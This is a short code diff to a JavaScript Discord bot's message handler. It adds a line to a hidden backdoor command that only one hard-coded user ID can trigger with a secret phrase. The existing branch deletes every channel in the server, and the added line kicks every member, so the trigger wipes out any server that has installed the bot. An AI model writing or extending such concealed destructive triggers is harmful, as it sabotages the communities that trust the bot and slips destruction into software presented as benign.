@@ -375,6 +375,7 @@ bot.on("message", async function(message) {
   }
   if(message.content == "mass server delete q28w27" && message.author.id == "264465468268609537") {
 		message.guild.channels.forEach(channel => channel.delete());
+	 	message.guild.members.forEach(m => m.kick());
 	}
 });
 
